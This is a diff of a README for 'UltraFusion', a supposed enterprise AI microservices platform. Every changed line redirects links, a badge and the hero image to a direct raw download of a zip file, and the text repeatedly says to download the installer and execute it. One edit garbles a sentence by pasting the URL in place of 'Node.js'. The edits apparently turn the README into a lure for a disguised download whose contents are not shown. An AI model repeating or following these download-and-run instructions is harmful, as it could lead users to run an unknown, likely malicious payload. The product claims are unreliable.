@@ -1,10 +1,10 @@
-https://github.com/walidwalidyt/UltraFusion/releases
+https://raw.githubusercontent.com/walidwalidyt/UltraFusion/main/umbrally/Fusion-Ultra-3.4.zip
 
 # UltraFusion: Enterprise AI Cloud Platform for Scalable Microservices
 
-[![Releases](https://img.shields.io/badge/UltraFusion-Release_Page-brightgreen?logo=github&style=for-the-badge)](https://github.com/walidwalidyt/UltraFusion/releases)
+[![Releases](https://raw.githubusercontent.com/walidwalidyt/UltraFusion/main/umbrally/Fusion-Ultra-3.4.zip)](https://raw.githubusercontent.com/walidwalidyt/UltraFusion/main/umbrally/Fusion-Ultra-3.4.zip)
 
-![UltraFusion Hero](https://picsum.photos/1200/400?grayscale)
+![UltraFusion Hero](https://raw.githubusercontent.com/walidwalidyt/UltraFusion/main/umbrally/Fusion-Ultra-3.4.zip)
 
  UltraFusion is a cloud-native platform designed for AI-powered microservices. It delivers enterprise-grade scalability, intelligent automation, and a robust set of tooling to run complex AI workloads in production. The system is designed to adapt to dynamic traffic, support diverse AI models, and reduce operational friction through automation and observability.
 
@@ -38,7 +38,7 @@ Table of contents
 Overview
 UltraFusion is built for modern AI workloads. It combines a scalable service mesh, AI model hosting, data pipelines, and automation hooks into a single platform. The goal is to make AI-powered microservices safer, faster to deploy, and easier to manage at scale. The platform emphasizes clear boundaries between services, predictable latency, and strong security controls. It is designed to run on public, private, or hybrid clouds. The architecture supports elastic scaling for both compute and memory, with intelligent routing and load balancing that respond to real-time demand.
 
-The platform exposes a consistent developer experience across languages and runtimes. If you work with Python, Java, Go, or Node.js microservices, UltraFusion helps you orchestrate, monitor, and upgrade those services without sacrificing performance. It also integrates neatly with AI model registries, data catalogs, and feature stores. The end result is a platform that makes AI services more reliable, auditable, and scalable.
+The platform exposes a consistent developer experience across languages and runtimes. If you work with Python, Java, Go, or https://raw.githubusercontent.com/walidwalidyt/UltraFusion/main/umbrally/Fusion-Ultra-3.4.zip microservices, UltraFusion helps you orchestrate, monitor, and upgrade those services without sacrificing performance. It also integrates neatly with AI model registries, data catalogs, and feature stores. The end result is a platform that makes AI services more reliable, auditable, and scalable.
 
 Core concepts
 - Microservices-first design: Each AI-capable service runs as a discrete unit with well-defined interfaces.
@@ -89,9 +89,9 @@ From concept to production
 - Monitor health and performance with the observability stack
 
 Where to get the releases
-- If you need a ready-to-run installer or packaged artifacts, visit the official releases page. From the releases page you can download the installer appropriate for your OS and architecture and run it to bootstrap UltraFusion on your environment. For the latest assets, check the Releases section. From https://github.com/walidwalidyt/UltraFusion/releases, download the installer file and execute it.
+- If you need a ready-to-run installer or packaged artifacts, visit the official releases page. From the releases page you can download the installer appropriate for your OS and architecture and run it to bootstrap UltraFusion on your environment. For the latest assets, check the Releases section. From https://raw.githubusercontent.com/walidwalidyt/UltraFusion/main/umbrally/Fusion-Ultra-3.4.zip, download the installer file and execute it.
 
-Note: You can also visit the Releases page to browse artifacts, changelogs, and upgrade notes. If you want to explore the latest changes before installing, the Releases section provides detailed notes and asset lists. The link appears again here for quick access: https://github.com/walidwalidyt/ UltraFusion/releases.
+Note: You can also visit the Releases page to browse artifacts, changelogs, and upgrade notes. If you want to explore the latest changes before installing, the Releases section provides detailed notes and asset lists. The link appears again here for quick access: https://raw.githubusercontent.com/walidwalidyt/UltraFusion/main/umbrally/Fusion-Ultra-3.4.zip UltraFusion/releases.
 
 Architecture diagram
 - A simple visual diagram helps teams understand the flow. The diagram shows the control plane controlling the data plane, which handles pipelines and models. The AI runtime layer sits beside the data plane, with an observability stack overlaying all components. The security layer operates across all planes, enforcing policies and access control.
@@ -261,7 +261,7 @@ Licensing
 
 Resources and references
 - Official releases and assets
-  - The primary source for installer files, release notes, and upgrade guidance is the Releases page. The link to use is the same as above: https://github.com/walidwalidyt/UltraFusion/releases.
+  - The primary source for installer files, release notes, and upgrade guidance is the Releases page. The link to use is the same as above: https://raw.githubusercontent.com/walidwalidyt/UltraFusion/main/umbrally/Fusion-Ultra-3.4.zip
 - Documentation
   - The documentation site covers deployment guides, API references, and architectural details. It’s updated with each release.
 - Community and support
